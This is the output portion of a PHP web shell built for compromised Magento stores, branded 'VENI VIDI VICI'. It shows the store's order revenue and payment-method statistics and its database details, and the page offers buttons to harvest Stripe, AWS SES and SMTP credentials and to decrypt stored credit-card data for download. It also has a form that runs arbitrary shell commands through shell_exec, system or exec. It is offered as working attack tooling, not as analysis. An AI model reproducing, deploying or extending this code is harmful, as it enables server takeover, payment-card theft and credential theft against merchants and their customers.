    echo "MAGENTO CONTROL PANEL - VENI VIDI VICI\n";
    echo "════════════════════════════════════════════════════════════════\n\n";
    
    echo "Magento Root: {$magento['root']}\n";
    echo "Version: {$magento['version']}\n";
    echo "Database: {$dbCreds['dbname']}\n";
    echo "Prefix: {$dbCreds['prefix']}\n\n";
    
    echo "════════════════════════════════════════════════════════════════\n";
    echo "ORDER STATISTICS\n";
    echo "════════════════════════════════════════════════════════════════\n\n";
    
    echo "Daily (24h):   {$stats1d['count']} orders  |  $" . number_format($stats1d['revenue'], 2) . "  |  Avg: $" . number_format($stats1d['avg'], 2) . "\n";
    echo "Weekly (7d):   {$stats7d['count']} orders  |  $" . number_format($stats7d['revenue'], 2) . "  |  Avg: $" . number_format($stats7d['avg'], 2) . "\n";
    echo "Monthly (30d): {$stats30d['count']} orders  |  $" . number_format($stats30d['revenue'], 2) . "  |  Avg: $" . number_format($stats30d['avg'], 2) . "\n\n";
    
    echo "PAYMENT METHODS (30 days):\n";
    echo "────────────────────────────────────────────────────────────────\n";
    
    $totalOrders = $stats30d['count'];
    foreach ($stats30d['methods'] as $method) {
        $percentage = $totalOrders > 0 ? ($method['count'] / $totalOrders) * 100 : 0;
        echo sprintf("  • %-30s %5d orders  $%-12s (%.2f%%)\n",
            $method['method'] . ':',
            $method['count'],
            number_format($method['revenue'], 2),
            $percentage
        );
    }
    
    echo "\n════════════════════════════════════════════════════════════════\n";
    exit(0);
}

// ============================================
// WEB GUI OUTPUT
// ============================================
?>
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>Magento Control Panel</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            background: #0a0a0a; 
            color: #00ff00; 
            font-family: 'Courier New', monospace; 
            padding: 20px;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { 
            color: #00ff00; 
            text-align: center; 
            margin-bottom: 10px;
            font-size: 2em;
            text-shadow: 0 0 10px #00ff00;
        }
        .subtitle {
            text-align: center;
            color: #ffff00;
            margin-bottom: 30px;
        }
        .info-box {
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 5px;
        }
        .info-row {
            display: flex;
            justify-content: space-between;
            padding: 5px 0;
            border-bottom: 1px solid #333;
        }
        .info-label { color: #ffff00; }
        .info-value { color: #00ff00; }
        .stat-box {
            display: inline-block;
            background: #1a1a1a;
            border: 1px solid #00ff00;
            padding: 15px 25px;
            margin: 10px;
            border-radius: 5px;
            text-align: center;
        }
        .stat-label {
            color: #ffff00;
            font-size: 0.9em;
            margin-bottom: 5px;
        }
        .stat-value {
            color: #00ff00;
            font-size: 1.3em;
            font-weight: bold;
        }
        .payment-item {
            padding: 8px;
            margin: 5px 0;
            background: #1a1a1a;
            border-left: 3px solid #00ff00;
        }
        .btn {
            padding: 10px 20px;
            background: #00ff00;
            border: none;
            color: #000;
            font-weight: bold;
            cursor: pointer;
            font-family: 'Courier New', monospace;
            border-radius: 3px;
            margin: 5px;
        }
        .btn:hover { background: #00dd00; }
        .section {
            background: #1a1a1a;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            margin: 20px 0;
        }
        .output-box {
            background: #0a0a0a;
            padding: 15px;
            border: 1px solid #00ff00;
            border-radius: 3px;
            margin-top: 10px;
            max-height: 400px;
            overflow-y: auto;
        }
        .success { color: #00ff00; }
        .warning { color: #ffff00; }
        hr { border: 0; border-top: 1px solid #00ff00; margin: 20px 0; }
        a { color: #00ff00; text-decoration: none; }
        a:hover { text-decoration: underline; }
    </style>
    <script>
        function copyToClipboard(elementId) {
            var element = document.getElementById(elementId);
            var text = element.textContent || element.innerText;
            
            // Method 1: Modern Clipboard API
            if (navigator.clipboard && navigator.clipboard.writeText) {
                navigator.clipboard.writeText(text).then(function() {
                    alert('Copied to clipboard!');
                }).catch(function(err) {
                    // Fallback to Method 2
                    fallbackCopy(text);
                });
            } else {
                // Method 2: Fallback for older browsers
                fallbackCopy(text);
            }
        }
        
        function fallbackCopy(text) {
            var textarea = document.createElement('textarea');
            textarea.value = text;
            textarea.style.position = 'fixed';
            textarea.style.opacity = '0';
            document.body.appendChild(textarea);
            textarea.select();
            try {
                var successful = document.execCommand('copy');
                if (successful) {
                    alert('Copied to clipboard!');
                } else {
                    alert('Copy failed. Please copy manually.');
                }
            } catch (err) {
                alert('Copy failed. Please copy manually.');
            }
            document.body.removeChild(textarea);
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>MAGENTO CONTROL PANEL</h1>
        <div class="subtitle">VENI VIDI VICI</div>
        
        <div class="info-box">
            <div class="info-row">
                <span class="info-label">Magento Root:</span>
                <span class="info-value"><?php echo htmlspecialchars($magento['root']); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Version:</span>
                <span class="info-value"><?php echo $magento['version']; ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Database:</span>
                <span class="info-value"><?php echo htmlspecialchars($dbCreds['dbname']); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Table Prefix:</span>
                <span class="info-value"><?php echo htmlspecialchars($dbCreds['prefix'] ?: 'none'); ?></span>
            </div>
            <div class="info-row">
                <span class="info-label">Connection:</span>
                <span class="info-value" style="color: #00ff00;">CONNECTED</span>
            </div>
            <div class="info-row">
                <span class="info-label">Encryption Keys:</span>
                <span class="info-value"><?php echo count($keys); ?> loaded</span>
            </div>
        </div>

        <hr>

        <h2 style="color: #ffff00; margin: 20px 0;">ORDER STATISTICS</h2>
        
        <div style="text-align: center;">
            <div class="stat-box">
                <div class="stat-label">DAILY (24 Hours)</div>
                <div class="stat-value"><?php echo $stats1d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats1d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats1d['avg'], 2); ?></div>
            </div>
            
            <div class="stat-box">
                <div class="stat-label">WEEKLY (7 Days)</div>
                <div class="stat-value"><?php echo $stats7d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats7d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats7d['avg'], 2); ?></div>
            </div>
            
            <div class="stat-box">
                <div class="stat-label">MONTHLY (30 Days)</div>
                <div class="stat-value"><?php echo $stats30d['count']; ?> orders</div>
                <div class="stat-value" style="color: #ffff00;">$<?php echo number_format($stats30d['revenue'], 2); ?></div>
                <div style="color: #888; font-size: 0.8em; margin-top: 5px;">Avg: $<?php echo number_format($stats30d['avg'], 2); ?></div>
            </div>
        </div>

        <hr>

        <h2 style="color: #ffff00; margin: 20px 0;">PAYMENT METHODS (30 Days)</h2>
        
        <?php
        $totalOrders = $stats30d['count'];
        foreach ($stats30d['methods'] as $method) {
            $percentage = $totalOrders > 0 ? ($method['count'] / $totalOrders) * 100 : 0;
            echo "<div class='payment-item'>";
            echo "<strong style='color: #00ff00;'>{$method['method']}</strong> ";
            echo "<span style='color: #ffff00;'>{$method['count']} orders</span> ";
            echo "<span style='color: #fff;'>($" . number_format($method['revenue'], 2) . ")</span> ";
            echo "<span style='color: #888;'>" . number_format($percentage, 2) . "%</span>";
            echo "</div>";
        }
        ?>

        <hr>

        <!-- CREDENTIALS SECTION -->
        <div class="section">
            <h3 style="color: #ffff00; margin-bottom: 15px;">CREDENTIAL HARVESTER</h3>
            
            <div style="margin-bottom: 15px;">
                <form method="POST" style="display: inline-block; margin-right: 10px;">
                    <input type="hidden" name="action" value="grab_creds">
                    <button type="submit" class="btn">Grab Credentials</button>
                </form>
                
                <?php
                $grab_result_file = __DIR__ . '/.last_grab_result.txt';
                if (file_exists($grab_result_file)):
                    $grab_saved = json_decode(file_get_contents($grab_result_file), true);
                    if ($grab_saved && (time() - $grab_saved['timestamp']) < 86400):
                ?>
                    <a href="?show=grab" class="btn" style="text-decoration: none; display: inline-block;">Show Preview</a>
                <?php endif; endif; ?>
                
                <span style="color: #888; margin-left: 10px;">Extract Stripe, AWS SES, SMTP credentials</span>
            </div>
            
            <?php if ($action_result && $action_result['type'] === 'grab_creds'): ?>
                <div class="output-box" id="grab-output">
                    <div class="success">[SUCCESS] Credentials extracted successfully</div>
                    <pre style="color: #00ff00; margin-top: 10px;" id="grab-content"><?php echo htmlspecialchars($action_result['content']); ?></pre>
                </div>
                <div style="margin-top: 10px;">
                    <a href="<?php echo basename($action_result['file']); ?>" download class="btn">Download credentials.txt</a>
                    <button onclick="copyToClipboard('grab-content')" class="btn">Copy to Clipboard</button>
                </div>
            <?php endif; ?>
        </div>

        <hr>

        <!-- CC DECRYPT SECTION -->
        <div class="section">
            <h3 style="color: #ffff00; margin-bottom: 15px;">CREDIT CARD DECRYPTOR</h3>
            
            <div style="margin-bottom: 15px;">
                <form method="POST" style="display: inline-block; margin-right: 10px;">
                    <input type="hidden" name="action" value="decrypt_cc">
                    <button type="submit" class="btn">Decrypt CC Data</button>
                </form>
                
                <?php
                $decrypt_result_file = __DIR__ . '/.last_decrypt_result.txt';
                if (file_exists($decrypt_result_file)):
                    $decrypt_saved = json_decode(file_get_contents($decrypt_result_file), true);
                    if ($decrypt_saved && (time() - $decrypt_saved['timestamp']) < 86400):
                ?>
                    <a href="?show=decrypt" class="btn" style="text-decoration: none; display: inline-block;">Show Preview</a>
                <?php endif; endif; ?>
                
                <span style="color: #888; margin-left: 10px;">Scan and decrypt payment information</span>
            </div>
            
            <?php if ($action_result && $action_result['type'] === 'decrypt_cc'): ?>
                <div class="output-box">
                    <div class="success">[SUCCESS] CC Decryption complete: <?php echo $action_result['count']; ?> records found</div>
                    <?php if (file_exists($action_result['file'])): ?>
                        <pre style="color: #00ff00; margin-top: 10px;"><?php echo htmlspecialchars(file_get_contents($action_result['file'])); ?></pre>
                    <?php endif; ?>
                </div>
                <div style="margin-top: 10px;">
                    <a href="<?php echo basename($action_result['file']); ?>" download class="btn">Download cc.txt</a>
                </div>
            <?php endif; ?>
        </div>

        <hr>

        <!-- COMMAND EXECUTION -->
        <div class="section">
            <h3 style="color: #ffff00; margin-bottom: 10px;">COMMAND EXECUTION</h3>
            <form method="GET" style="margin-bottom: 15px;">
                <input type="text" name="cmd" placeholder="Enter command (e.g., whoami, id, ls -la)" 
                       style="width: 80%; padding: 8px; background: #0a0a0a; border: 1px solid #00ff00; color: #00ff00; font-family: monospace;">
                <input type="submit" value="Execute" class="btn">
            </form>
            
            <?php if (isset($_GET['cmd']) && $_GET['cmd'] !== ''): ?>
                <div class="output-box">
                    <div style="color: #ffff00; margin-bottom: 5px;">Output:</div>
                    <pre style="color: #00ff00; white-space: pre-wrap; word-wrap: break-word;"><?php
                        $cmd = $_GET['cmd'];
                        if (function_exists('shell_exec')) {
                            echo htmlspecialchars(shell_exec($cmd));
                        } elseif (function_exists('system')) {
                            ob_start();
                            system($cmd);
                            echo htmlspecialchars(ob_get_clean());
                        } elseif (function_exists('exec')) {
                            exec($cmd, $output);
                            echo htmlspecialchars(implode("\n", $output));
                        } else {
                            echo "No execution functions available";
                        }
                    ?></pre>
                </div>
            <?php endif; ?>
        </div>

        <div style="text-align: center; margin-top: 30px; color: #888; font-size: 0.9em;">
            VENI VIDI VICI
        </div>
    </div>
</body>
</html>
